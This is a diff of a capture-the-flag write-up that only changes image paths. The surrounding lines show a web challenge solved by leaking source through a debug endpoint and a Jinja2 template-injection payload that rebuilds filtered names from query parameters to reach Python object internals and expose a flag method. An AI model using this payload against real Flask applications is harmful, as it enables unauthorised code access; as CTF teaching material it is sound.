@@ -2,12 +2,12 @@
 
 1.  Looking at the source code of main page you can find `/debug_it` endpoint.
  
-![Html source code](images/1.png)
+![Html source code](../images/1.png)
 
 2. When you try to access it you may see `Wrong method` information. To check how to access this endpoint, simply use `OPTIONS` HTTP request type.
 
 
-![OPTIONS response](images/2.png)
+![OPTIONS response](../images/2.png)
 
 3. After using `DEBUG` request type, you get the access to a part of source code of application. Part that interests us is here:
 ```python
@@ -81,7 +81,7 @@ We use similar method as before (a lot of query params and formats)
 {%set%20a,b,c,d,e,f,g,h,i,j,k,l%20=%20(request|attr(request.args.class|format(request.args.a,request.args.a,request.args.a,request.args.a))|attr(request.args.mro|format(request.args.a,request.args.a,request.args.a,request.args.a)))%}{{(l|attr(request.args.subclasses|format(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(597)|attr(request.args.dict|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&class=%s%sclass%s%s&a=_&mro=%s%smro%s%s&subclasses=%s%ssubclasses%s%s&dict=%s%sdict%s%s
 ```
 
-![dict response](images/5.png)
+![dict response](../images/5.png)
 
 - We can see `get_____flag()` method:
 ```jinja
@@ -89,4 +89,4 @@ We use similar method as before (a lot of query params and formats)
 ```
 
 
-![Result](images/4.png)
+![Result](../images/4.png)
